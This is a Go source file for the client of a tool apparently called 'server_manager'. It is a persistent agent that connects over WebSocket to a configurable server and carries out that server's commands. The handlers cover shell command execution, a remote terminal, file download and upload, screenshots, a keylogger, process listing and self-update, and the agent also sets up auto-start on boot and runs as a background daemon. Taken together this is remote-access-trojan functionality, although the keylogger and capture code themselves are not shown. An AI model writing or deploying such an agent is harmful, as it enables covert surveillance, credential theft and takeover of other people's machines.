package client

import (
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"runtime"
	"strings"
	"time"

	"mww2.com/server_manager/common"

	"github.com/gorilla/websocket"
)

const (
	ClientVersion = "1.0.0"
)

// Client represents the client application
type Client struct {
	config        *Config
	conn          *websocket.Conn
	authenticated bool
	running       bool
	instanceMgr   *InstanceManager

	// Component handlers
	commandExec *CommandExecutor
	fileBrowser *FileBrowser
	screenshot  *ScreenshotCapture
	keylogger   *Keylogger
	updater     *Updater
	autoStart   *AutoStart
	terminalMgr *TerminalManager

	// Channels
	sendChan chan *common.Message
	stopChan chan bool
}

// Config holds client configuration
type Config struct {
	ServerURL string
	ClientID  string
	AuthToken string
	AutoStart bool
}

// NewClient creates a new client instance
func NewClient(config *Config, instanceMgr *InstanceManager) *Client {
	log.Printf("[DEBUG] NewClient: Starting client creation")
	log.Printf("[DEBUG] NewClient: Creating terminal manager")
	terminalMgr := NewTerminalManager()

	log.Printf("[DEBUG] NewClient: Creating command executor")
	cmdExec := NewCommandExecutor()
	log.Printf("[DEBUG] NewClient: Creating file browser")
	fileBrowser := NewFileBrowser()
	log.Printf("[DEBUG] NewClient: Creating screenshot capture")
	screenshot := NewScreenshotCapture()
	log.Printf("[DEBUG] NewClient: Creating keylogger")
	keylogger := NewKeylogger()
	log.Printf("[DEBUG] NewClient: Creating updater")
	updater := NewUpdater(ClientVersion)
	log.Printf("[DEBUG] NewClient: Creating auto-start handler")
	autoStart := NewAutoStart("ServerManagerClient")

	log.Printf("[DEBUG] NewClient: Assembling client struct")
	client := &Client{
		config:      config,
		commandExec: cmdExec,
		fileBrowser: fileBrowser,
		screenshot:  screenshot,
		keylogger:   keylogger,
		updater:     updater,
		autoStart:   autoStart,
		terminalMgr: terminalMgr,
		sendChan:    make(chan *common.Message, 256),
		stopChan:    make(chan bool),
		instanceMgr: instanceMgr,
	}
	log.Printf("[DEBUG] NewClient: Client created successfully")

	// Set terminal output callbacks
	terminalMgr.SetOutputCallback(func(sessionID, data string) {
		payload := &common.TerminalOutputPayload{
			SessionID: sessionID,
			Data:      data,
		}
		client.sendMessage(common.MsgTypeTerminalOutput, payload)
	})

	terminalMgr.SetErrorCallback(func(sessionID, data string) {
		payload := &common.TerminalOutputPayload{
			SessionID: sessionID,
			Data:      data,
			Error:     "stderr",
		}
		client.sendMessage(common.MsgTypeTerminalOutput, payload)
	})

	return client
}

// Start starts the client
func (c *Client) Start() error {
	log.Printf("Starting client version %s", ClientVersion)
	log.Printf("Client ID: %s", c.config.ClientID)
	log.Printf("Server URL: %s", c.config.ServerURL)

	// Write PID file (single instance enforcement occurs before this call)
	if err := c.instanceMgr.WritePID(); err != nil {
		log.Printf("Warning: failed to write PID file: %v", err)
	}

	// Setup auto-start if configured
	if c.config.AutoStart {
		if err := c.autoStart.Enable(); err != nil {
			log.Printf("Warning: Failed to enable auto-start: %v", err)
		} else {
			log.Printf("Auto-start enabled")
		}
	}

	c.running = true

	// Start connection loop in background
	go c.connectionLoop()

	log.Printf("Client started successfully")
	return nil
}

// connectionLoop manages connection lifecycle with automatic reconnection
func (c *Client) connectionLoop() {
	reconnectDelay := 5 * time.Second
	maxReconnectDelay := 60 * time.Second

	for c.running {
		// Attempt to connect
		log.Printf("Attempting to connect to server...")
		if err := c.connect(); err != nil {
			log.Printf("Connection failed: %v", err)
			log.Printf("Retrying in %v...", reconnectDelay)
			time.Sleep(reconnectDelay)

			// Exponential backoff for reconnect delay
			reconnectDelay *= 2
			if reconnectDelay > maxReconnectDelay {
				reconnectDelay = maxReconnectDelay
			}
			continue
		}

		// Connection successful, reset delay
		reconnectDelay = 5 * time.Second
		log.Printf("Connected successfully")

		// Create a session-specific disconnect channel for this connection
		disconnectChan := make(chan bool, 1)

		// Start message pumps
		go c.readPump(disconnectChan)
		go c.writePump(disconnectChan)
		go c.heartbeatLoop(disconnectChan)

		// Wait for disconnection or stop signal
		select {
		case <-disconnectChan:
			log.Printf("Connection lost, will reconnect...")
			if c.conn != nil {
				c.conn.Close()
			}
			// Drain any remaining signals
			select {
			case <-disconnectChan:
			default:
			}
		case <-c.stopChan:
			log.Printf("Stop signal received")
			if c.conn != nil {
				c.conn.Close()
			}
			return
		}
	}
}

// Stop stops the client
func (c *Client) Stop() {
	log.Printf("Stopping client...")
	c.running = false
	close(c.stopChan)

	if c.keylogger.IsRunning() {
		c.keylogger.Stop()
	}

	if c.conn != nil {
		c.conn.Close()
	}

	c.instanceMgr.RemovePID()
	log.Printf("Client stopped")
}

// connect establishes connection to the server
func (c *Client) connect() error {
	log.Printf("Connecting to server: %s", c.config.ServerURL)

	// Setup TLS config - always verify certificates for HTTPS
	tlsConfig := &tls.Config{
		InsecureSkipVerify: false, // Always verify certificates
		MinVersion:         tls.VersionTLS12,
	}

	dialer := websocket.Dialer{
		TLSClientConfig:  tlsConfig,
		HandshakeTimeout: 10 * time.Second,
	}

	// Connect to WebSocket
	conn, _, err := dialer.Dial(c.config.ServerURL, http.Header{})
	if err != nil {
		// Provide more diagnostic info for common Windows TLS issues
		log.Printf("Connection failed: %v", err)
		if strings.Contains(err.Error(), "x509") {
			log.Printf("TLS verification error detected. If using a self-signed certificate, import the CA into the Windows Trusted Root Certification Authorities store.")
			log.Printf("For development, ensure you started server with valid certs or use nginx with a publicly trusted certificate.")
		}
		if strings.Contains(err.Error(), "handshake") {
			log.Printf("Handshake failed. Verify that the server URL scheme (ws:// vs wss://) matches server configuration (HTTP or TLS).")
		}
		return err
	}

	c.conn = conn
	log.Printf("WebSocket connection established (TLS verified)")

	// Authenticate
	if err := c.authenticate(); err != nil {
		c.conn.Close()
		return err
	}

	log.Printf("Authentication successful")
	return nil
}

// getLocalIP gets the local IP address
func (c *Client) getLocalIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return ""
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)
	return localAddr.IP.String()
}

// authenticate performs authentication with the server
func (c *Client) authenticate() error {
	hostname, _ := os.Hostname()
	localIP := c.getLocalIP()

	authPayload := &common.AuthPayload{
		ClientID: c.config.ClientID,
		Token:    c.config.ClientID, // Use machine ID as token
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		Hostname: hostname,
		IP:       localIP,
	}

	authMsg, err := common.NewMessage(common.MsgTypeAuth, authPayload)
	if err != nil {
		return err
	}

	// Send authentication message
	if err := c.conn.WriteJSON(authMsg); err != nil {
		return err
	}

	// Wait for response
	var respMsg common.Message
	if err := c.conn.ReadJSON(&respMsg); err != nil {
		return err
	}

	if respMsg.Type != common.MsgTypeAuthResponse {
		return ErrInvalidResponse
	}

	var authResp common.AuthResponsePayload
	if err := respMsg.ParsePayload(&authResp); err != nil {
		return err
	}

	if !authResp.Success {
		return ErrAuthFailed
	}

	c.authenticated = true
	return nil
}

// readPump reads messages from the server
func (c *Client) readPump(disconnectChan chan bool) {
	defer func() {
		log.Printf("readPump: Connection lost, signaling disconnection")
		// Signal disconnection
		select {
		case disconnectChan <- true:
		default:
		}
	}()

	c.conn.SetReadDeadline(time.Now().Add(60 * time.Second))
	c.conn.SetPongHandler(func(string) error {
		c.conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		return nil
	})

	for c.running {
		var msg common.Message
		err := c.conn.ReadJSON(&msg)
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("WebSocket error: %v", err)
			}
			break
		}

		// Handle message
		go c.handleMessage(&msg)
	}
}

// writePump writes messages to the server
func (c *Client) writePump(disconnectChan chan bool) {
	ticker := time.NewTicker(54 * time.Second)
	defer func() {
		ticker.Stop()
		if c.conn != nil {
			c.conn.Close()
		}
		log.Printf("writePump: Connection lost, signaling disconnection")
		// Signal disconnection
		select {
		case disconnectChan <- true:
		default:
		}
	}()

	for {
		select {
		case message, ok := <-c.sendChan:
			if c.conn == nil {
				return
			}
			c.conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
			if !ok {
				c.conn.WriteMessage(websocket.CloseMessage, []byte{})
				return
			}

			if err := c.conn.WriteJSON(message); err != nil {
				log.Printf("Write error: %v", err)
				return
			}

		case <-ticker.C:
			if c.conn == nil {
				return
			}
			c.conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
			if err := c.conn.WriteMessage(websocket.PingMessage, nil); err != nil {
				return
			}

		case <-c.stopChan:
			return
		}
	}
}

// handleMessage handles incoming messages from the server
func (c *Client) handleMessage(msg *common.Message) {
	log.Printf("Received message: %s", msg.Type)

	switch msg.Type {
	case common.MsgTypeExecuteCommand:
		c.handleExecuteCommand(msg)

	case common.MsgTypeBrowseFiles:
		c.handleBrowseFiles(msg)

	case common.MsgTypeGetDrives:
		c.handleGetDrives(msg)

	case common.MsgTypeDownloadFile:
		c.handleDownloadFile(msg)

	case common.MsgTypeUploadFile:
		c.handleUploadFile(msg)

	case common.MsgTypeTakeScreenshot:
		c.handleTakeScreenshot(msg)

	case common.MsgTypeStartKeylogger:
		c.handleStartKeylogger(msg)

	case common.MsgTypeStopKeylogger:
		c.handleStopKeylogger(msg)

	case common.MsgTypeUpdate:
		c.handleUpdate(msg)

	case common.MsgTypeStartTerminal:
		c.handleStartTerminal(msg)

	case common.MsgTypeTerminalInput:
		c.handleTerminalInput(msg)

	case common.MsgTypeStopTerminal:
		c.handleStopTerminal(msg)

	case common.MsgTypeListProcesses:
		c.handleListProcesses(msg)

	case common.MsgTypePing:
		c.sendMessage(common.MsgTypePong, nil)

	default:
		log.Printf("Unknown message type: %s", msg.Type)
	}
}

// handleExecuteCommand handles command execution requests
func (c *Client) handleExecuteCommand(msg *common.Message) {
	var payload common.ExecuteCommandPayload
	if err := msg.ParsePayload(&payload); err != nil {
		log.Printf("Failed to parse command payload: %v", err)
		return
	}

	log.Printf("Executing command: %s %v", payload.Command, payload.Args)
	result := c.commandExec.Execute(&payload)

	c.sendMessage(common.MsgTypeCommandResult, result)
}

// handleBrowseFiles handles file browsing requests
func (c *Client) handleBrowseFiles(msg *common.Message) {
	var payload common.BrowseFilesPayload
	if err := msg.ParsePayload(&payload); err != nil {
		log.Printf("Failed to parse browse payload: %v", err)
		return
	}

	log.Printf("Browsing files: %s", payload.Path)
	result := c.fileBrowser.Browse(&payload)

	c.sendMessage(common.MsgTypeFileList, result)
}

// handleGetDrives handles drive listing requests (Windows)
func (c *Client) handleGetDrives(msg *common.Message) {
	log.Printf("Getting drive list")
	result := c.fileBrowser.GetDrives()

	c.sendMessage(common.MsgTypeDriveList, result)
}

// handleDownloadFile handles file download requests
func (c *Client) handleDownloadFile(msg *common.Message) {
	var payload struct {
		Path string `json:"path"`
	}
	if err := msg.ParsePayload(&payload); err != nil {
		log.Printf("Failed to parse download payload: %v", err)
		return
	}

	log.Printf("Downloading file: %s", payload.Path)
	result := c.fileBrowser.ReadFile(payload.Path)

	c.sendMessage(common.MsgTypeFileData, result)
}

// handleUploadFile handles file upload requests
func (c *Client) handleUploadFile(msg *common.Message) {
	var payload common.FileDataPayload
	if err := msg.ParsePayload(&payload); err != nil {
		log.Printf("Failed to parse upload payload: %v", err)
		return
	}

	log.Printf("Uploading file: %s", payload.Path)
	err := c.fileBrowser.WriteFile(&payload)

	response := map[string]interface{}{
		"success": err == nil,
		"path":    payload.Path,
	}
	if err != nil {
		response["error"] = err.Error()
	}

	c.sendMessage(common.MsgTypeFileData, response)
}

// handleTakeScreenshot handles screenshot requests
func (c *Client) handleTakeScreenshot(msg *common.Message) {
	var payload common.ScreenshotPayload
	if err := msg.ParsePayload(&payload); err != nil {
		log.Printf("Failed to parse screenshot payload: %v", err)
		// Use default payload
	}

	log.Printf("Taking screenshot")
	result := c.screenshot.Capture(&payload)

	c.sendMessage(common.MsgTypeScreenshotData, result)
}

// handleStartKeylogger handles keylogger start requests
func (c *Client) handleStartKeylogger(msg *common.Message) {
	var payload common.KeyloggerPayload
	if err := msg.ParsePayload(&payload); err != nil {
		log.Printf("Failed to parse keylogger payload: %v", err)
		return
	}

	log.Printf("Starting keylogger: target=%s", payload.Target)
	err := c.keylogger.Start(&payload)

	status := &common.UpdateStatusPayload{
		Status: "started",
	}
	if err != nil {
		status.Status = "failed"
		status.Error = err.Error()
	}

	c.sendMessage(common.MsgTypeUpdateStatus, status)
}

// handleStopKeylogger handles keylogger stop requests
func (c *Client) handleStopKeylogger(msg *common.Message) {
	log.Printf("Stopping keylogger")
	err := c.keylogger.Stop()

	status := &common.UpdateStatusPayload{
		Status: "stopped",
	}
	if err != nil {
		status.Status = "failed"
		status.Error = err.Error()
	}

	c.sendMessage(common.MsgTypeUpdateStatus, status)
}

// handleUpdate handles update requests
func (c *Client) handleUpdate(msg *common.Message) {
	var payload common.UpdatePayload
	if err := msg.ParsePayload(&payload); err != nil {
		log.Printf("Failed to parse update payload: %v", err)
		return
	}

	log.Printf("Updating to version %s", payload.Version)
	result := c.updater.Update(&payload)

	c.sendMessage(common.MsgTypeUpdateStatus, result)

	// If update successful, restart
	if result.Status == "complete" {
		time.Sleep(2 * time.Second)
		c.updater.RestartClient()
	}
}

// handleStartTerminal handles terminal start requests
func (c *Client) handleStartTerminal(msg *common.Message) {
	var payload common.StartTerminalPayload
	if err := msg.ParsePayload(&payload); err != nil {
		log.Printf("Failed to parse start terminal payload: %v", err)
		return
	}

	log.Printf("Starting terminal session: %s", payload.SessionID)
	err := HandleStartTerminal(c.terminalMgr, &payload)

	if err != nil {
		errorPayload := &common.TerminalOutputPayload{
			SessionID: payload.SessionID,
			Data:      "",
			Error:     err.Error(),
		}
		c.sendMessage(common.MsgTypeTerminalOutput, errorPayload)
	}
}

// handleTerminalInput handles terminal input
func (c *Client) handleTerminalInput(msg *common.Message) {
	var payload common.TerminalInputPayload
	if err := msg.ParsePayload(&payload); err != nil {
		log.Printf("Failed to parse terminal input payload: %v", err)
		return
	}

	err := HandleTerminalInput(c.terminalMgr, &payload)
	if err != nil {
		log.Printf("Terminal input error: %v", err)
	}
}

// handleStopTerminal handles terminal stop requests
func (c *Client) handleStopTerminal(msg *common.Message) {
	var payload common.TerminalInputPayload
	if err := msg.ParsePayload(&payload); err != nil {
		log.Printf("Failed to parse stop terminal payload: %v", err)
		return
	}

	log.Printf("Stopping terminal session: %s", payload.SessionID)
	err := HandleStopTerminal(c.terminalMgr, payload.SessionID)
	if err != nil {
		log.Printf("Failed to stop terminal: %v", err)
	}
}

// handleListProcesses handles process list requests
func (c *Client) handleListProcesses(msg *common.Message) {
	log.Printf("Getting process list")

	processes := getProcessList()
	result := &common.ProcessListPayload{
		Processes: processes,
	}

	c.sendMessage(common.MsgTypeProcessList, result)
}

// getProcessList retrieves the list of running processes
func getProcessList() []common.Process {
	var processes []common.Process

	// Implementation varies by OS
	osProcesses := getOSProcessList()
	for _, p := range osProcesses {
		processes = append(processes, common.Process{
			Name:   p.Name,
			PID:    p.PID,
			CPU:    p.CPU,
			Memory: p.Memory,
			Status: "running",
		})
	}

	return processes
}

// OSProcess represents a process with OS-specific data
type OSProcess struct {
	Name   string
	PID    int
	CPU    float64
	Memory float64
}

// getOSProcessList is implemented per-OS
func getOSProcessList() []OSProcess {
	// Platform-specific implementation - will be in system_stats_*.go
	return getOSProcessListImpl()
}

// sendMessage sends a message to the server
func (c *Client) sendMessage(msgType common.MessageType, payload interface{}) {
	msg, err := common.NewMessage(msgType, payload)
	if err != nil {
		log.Printf("Failed to create message: %v", err)
		return
	}

	select {
	case c.sendChan <- msg:
	case <-time.After(5 * time.Second):
		log.Printf("Failed to send message: timeout")
	}
}

// heartbeatLoop sends periodic heartbeat messages
func (c *Client) heartbeatLoop(disconnectChan chan bool) {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			c.sendHeartbeat()
		case <-disconnectChan:
			return
		case <-c.stopChan:
			return
		}
	}
}

// sendHeartbeat sends a heartbeat message with system stats
func (c *Client) sendHeartbeat() {
	var cpuUsage, memUsage, diskUsage float64

	// Safely get stats with error handling
	if stats := getSafeSystemStats(); stats != nil {
		cpuUsage = stats["cpu"]
		memUsage = stats["mem"]
		diskUsage = stats["disk"]
	}

	payload := &common.HeartbeatPayload{
		ClientID:   c.config.ClientID,
		Status:     "online",
		CPUUsage:   cpuUsage,
		MemUsage:   memUsage,
		DiskUsage:  diskUsage,
		Uptime:     0, // Could track actual uptime
		LastActive: time.Now(),
	}

	c.sendMessage(common.MsgTypeHeartbeat, payload)
}

// Main is the main entry point for the client
func Main() {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("[PANIC] Recovered from panic: %v", r)
			log.Printf("[PANIC] Waiting 30 seconds before exit to allow log review...")
			time.Sleep(30 * time.Second)
			os.Exit(1)
		}
	}()

	// Build mode will be set by build tags (debug or release)
	log.Printf("Client build mode: %s", BuildMode)
	log.Printf("[DEBUG] Main: Starting client initialization")
	log.Printf("[DEBUG] Main: Go version: %s, OS: %s, Arch: %s", runtime.Version(), runtime.GOOS, runtime.GOARCH)

	// Preserve original args for diagnostics and manual fallback parsing
	origArgs := append([]string{}, os.Args...)

	// Handle subcommands: start|stop|restart|status (default: start)
	command := "start"
	if len(os.Args) > 1 {
		first := os.Args[1]
		if first == "start" || first == "stop" || first == "restart" || first == "status" {
			command = first
			// Remove subcommand from args before flag parsing
			os.Args = append([]string{os.Args[0]}, os.Args[2:]...)
		}
	}
	log.Printf("[DEBUG] Args original: %v", origArgs)
	log.Printf("[DEBUG] Args after subcommand strip: %v", os.Args)

	// Normalize boolean flags like `-daemon false` to `-daemon=false` before flag.Parse
	if command == "start" || command == "restart" { // only relevant for start-like commands
		normalized := []string{os.Args[0]}
		for i := 1; i < len(os.Args); i++ {
			arg := os.Args[i]
			if arg == "-daemon" || arg == "--daemon" {
				if i+1 < len(os.Args) && (os.Args[i+1] == "false" || os.Args[i+1] == "0" || os.Args[i+1] == "true" || os.Args[i+1] == "1") {
					val := os.Args[i+1]
					normalized = append(normalized, "-daemon="+val)
					i++
					continue
				}
				// No explicit value present; treat presence as true
				normalized = append(normalized, "-daemon=true")
				continue
			}
			if arg == "-autostart" || arg == "--autostart" {
				if i+1 < len(os.Args) && (os.Args[i+1] == "false" || os.Args[i+1] == "0" || os.Args[i+1] == "true" || os.Args[i+1] == "1") {
					val := os.Args[i+1]
					normalized = append(normalized, "-autostart="+val)
					i++
					continue
				}
				normalized = append(normalized, "-autostart=true")
				continue
			}
			// Leave other args unchanged
			normalized = append(normalized, arg)
		}
		os.Args = normalized
		log.Printf("[DEBUG] Args normalized: %v", os.Args)
	}

	instanceMgr := NewInstanceManager()
	if command != "start" { // For stop/status/restart we only need instance manager
		switch command {
		case "status":
			if running, pid := instanceMgr.IsRunning(); running {
				fmt.Printf("Client running (PID %d)\n", pid)
			} else {
				fmt.Println("Client not running")
			}
			return
		case "stop":
			if err := instanceMgr.Kill(); err != nil {
				fmt.Printf("Stop failed: %v\n", err)
			} else {
				fmt.Println("Client stopped")
			}
			return
		case "restart":
			_ = instanceMgr.Kill() // Ignore error; may not be running
			// Continue to start below.
			fmt.Println("Restarting client...")
		}
	}

	// Enforce single instance before full start (except when restart bypassed)
	if command == "start" {
		if running, pid := instanceMgr.IsRunning(); running {
			fmt.Printf("Client already running (PID %d)\n", pid)
			return
		}
	}

	// Parse command line flags (after removing subcommand)
	serverURL := flag.String("server", "wss://localhost/ws", "Server WebSocket URL (must include /ws path; use wss:// for HTTPS)")
	autoStart := flag.Bool("autostart", DefaultAutoStart, fmt.Sprintf("Enable auto-start on boot (default: %v for %s build)", DefaultAutoStart, BuildMode))
	daemon := flag.Bool("daemon", DefaultDaemon, fmt.Sprintf("Run as background daemon/service (default: %v for %s build)", DefaultDaemon, BuildMode))
	log.Printf("[DEBUG] Main: Parsing command line flags")
	flag.Parse()
	log.Printf("[DEBUG] Main: Flags parsed - server=%s, autostart=%v, daemon=%v", *serverURL, *autoStart, *daemon)

	// Manual fallback parsing if flag failed to capture value (some Windows shells edge cases)
	if *serverURL == "wss://localhost/ws" { // unchanged from default
		for i, a := range origArgs {
			if a == "-server" || a == "--server" {
				if i+1 < len(origArgs) {
					*serverURL = origArgs[i+1]
					log.Printf("[DEBUG] Manual flag recovery: server=%s", *serverURL)
				}
			}
			if strings.HasPrefix(a, "-server=") || strings.HasPrefix(a, "--server=") {
				parts := strings.SplitN(a, "=", 2)
				if len(parts) == 2 && parts[1] != "" {
					*serverURL = parts[1]
					log.Printf("[DEBUG] Manual flag recovery (inline): server=%s", *serverURL)
				}
			}
		}
	}

	// Environment override (lowest priority after explicit flags)
	if envServer := os.Getenv("SERVER_URL"); envServer != "" && (*serverURL == "" || *serverURL == "wss://localhost/ws") {
		*serverURL = envServer
		log.Printf("[DEBUG] SERVER_URL env override applied: %s", *serverURL)
	}

	// Ensure /ws suffix (server expects /ws endpoint); if missing, append
	if *serverURL != "" && !strings.Contains(*serverURL, "/ws") {
		if strings.HasSuffix(*serverURL, "/") {
			*serverURL = strings.TrimRight(*serverURL, "/") + "/ws"
		} else {
			*serverURL = *serverURL + "/ws"
		}
		log.Printf("[DEBUG] Appended /ws to server URL: %s", *serverURL)
	}

	// Run as daemon if requested
	if *daemon && !IsDaemon() {
		log.Println("Starting as background daemon...")
		if err := Daemonize(); err != nil {
			log.Fatalf("Failed to daemonize: %v", err)
		}
		return
	}

	// Setup logging based on build mode
	logFile := SetupLogging(*daemon)
	if logFile != nil {
		defer logFile.Close()
	}

	// Generate machine ID automatically
	log.Printf("[DEBUG] Main: Creating machine ID generator")
	idGen := NewMachineIDGenerator()
	log.Printf("[DEBUG] Main: Getting machine ID")
	machineID, err := idGen.GetMachineID()
	if err != nil {
		// Fallback: use hostname + time-based hash to avoid exit
		log.Printf("[DEBUG] Main: Machine ID generation failed: %v", err)
		host, _ := os.Hostname()
		machineID = fmt.Sprintf("fallback-%s-%d", host, time.Now().Unix())
		log.Printf("Warning: using fallback machine ID: %s (error: %v)", machineID, err)
	}
	log.Printf("[DEBUG] Main: Machine ID obtained: %s", machineID)

	log.Printf("Machine ID: %s", machineID)
	log.Printf("Authentication: Using machine ID (no token required)")

	config := &Config{
		ServerURL: *serverURL,
		ClientID:  machineID,
		AuthToken: machineID, // Use machine ID as authentication
		AutoStart: *autoStart,
	}

	// Create and start client
	log.Printf("[DEBUG] Main: Creating client instance")
	client := NewClient(config, instanceMgr)
	log.Printf("[DEBUG] Main: Client created, starting connection loop")
	for {
		if err := client.Start(); err != nil {
			log.Printf("Failed to start client: %v (retrying in 10s)", err)
			time.Sleep(10 * time.Second)
			continue
		}
		break
	}

	log.Printf("[DEBUG] Main: Client started successfully, entering wait loop (server=%s)", config.ServerURL)
	// Wait until process killed externally; simple sleep loop to allow Stop() to run on termination
	for {
		if !client.running {
			break
		}
		time.Sleep(5 * time.Second)
	}
}
